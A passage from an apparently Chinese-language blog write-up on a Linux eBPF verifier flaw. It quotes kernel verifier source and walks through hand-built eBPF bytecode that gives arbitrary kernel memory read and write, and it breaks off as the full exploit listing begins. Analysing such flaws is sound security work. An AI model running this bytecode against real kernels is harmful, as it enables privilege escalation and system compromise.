class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">  <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) != BPF_K ||</span><br><span class="line">      insn-&gt;imm != <span class="number">0</span> ||</span><br><span class="line">      insn-&gt;src_reg != BPF_REG_0 ||</span><br><span class="line">      insn-&gt;dst_reg != BPF_REG_0) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;BPF_EXIT uses reserved fields\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* eBPF calling convetion is such that R0 is used</span></span><br><span class="line"><span class="comment"> * to return the value from eBPF program.</span></span><br><span class="line"><span class="comment"> * Make sure that it&#x27;s readable at this time</span></span><br><span class="line"><span class="comment"> * of bpf_exit, which means that program wrote</span></span><br><span class="line"><span class="comment"> * something into it earlier</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  err = check_reg_arg(regs, BPF_REG_0, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EACCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process_bpf_exit:</span><br><span class="line">  insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">  <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_print_state = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line"><span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line"><span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">elem = env-&gt;head-&gt;next;</span><br><span class="line">kfree(env-&gt;head);</span><br><span class="line">env-&gt;head = elem;</span><br><span class="line">env-&gt;stack_size--;</span><br><span class="line"><span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span><span class="comment">/* eBPF program being verified */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">head</span>;</span> <span class="comment">/* stack of verifier states to be processed */</span></span><br><span class="line"><span class="keyword">int</span> stack_size;<span class="comment">/* number of states to be processed */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> <span class="title">cur_state</span>;</span> <span class="comment">/* current verifier state */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_state_list</span> **<span class="title">explored_states</span>;</span> <span class="comment">/* search pruning optimization */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">used_maps</span>[<span class="title">MAX_USED_MAPS</span>];</span> <span class="comment">/* array of map&#x27;s used by eBPF program */</span></span><br><span class="line">u32 used_map_cnt;<span class="comment">/* number of used maps */</span></span><br><span class="line"><span class="keyword">bool</span> allow_ptr_leaks;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以我们在实现构造时需要将head位置为0，根据函数名<code>pop_stack</code>可以推测出来这里其实也就是栈的操作，所以大致的构造方法是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN(),</span><br><span class="line">option,</span><br><span class="line">pandding == <span class="number">0</span>,</span><br><span class="line">options</span><br></pre></td></tr></table></figure><h3 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h3><p>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment"> * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                         insn-&gt;dst_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment"> * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment"> * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment"> * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment"> * with different pointer types:</span></span><br><span class="line"><span class="comment"> * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment"> * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment"> * Reject it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">    err = check_xadd(env, insn);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src1 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  <span class="comment">/* check src2 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                         insn-&gt;src_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    insn-&gt;imm = dst_reg_type;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_mem_access</code>函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。所以这里使用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。</p><p>最终构造的eBPF指令为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------part <span class="number">1</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN()                                                            */</span></span><br><span class="line">----------------------------------------------part <span class="number">2</span> ----------------------------------------------</span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">----------------------------------------------part <span class="number">3</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map中Key值为0的value值存放到reg_6</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">12.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">13.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */</span></span><br><span class="line"><span class="number">14.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */</span></span><br><span class="line"><span class="number">15.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">16.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">17.</span> <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">4</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(1, BPF_REG_7)  r7=address,取map中Key值为1的value值存放到reg_7</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">21.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">22.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">23.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">24.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */</span></span><br><span class="line"><span class="number">25.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */</span></span><br><span class="line"><span class="number">26.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">27.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">28.</span> <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">5</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map中Key值为2的value值存放到reg_8</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">32.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">33.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">34.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">35.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */</span></span><br><span class="line"><span class="number">36.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span></span><br><span class="line"><span class="number">37.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">38.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">39.</span> <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">6</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    此时r2和r0都指向map中key=2的元素           */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), 读取BPF_REG_7地址的内容放到BPF_REG_3</span></span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),将BPF_REG_3的内容放入到BPF_REG_2</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br><span class="line"><span class="number">7.</span> <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+2</span></span><br><span class="line"><span class="number">8.</span> <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 将rbp寄存器的值即fp指针放到BPF_REG_2</span></span><br><span class="line"><span class="number">9.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 往BPF_REG_7的地址写入BPF_REG_8</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br></pre></td></tr></table></figure><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span 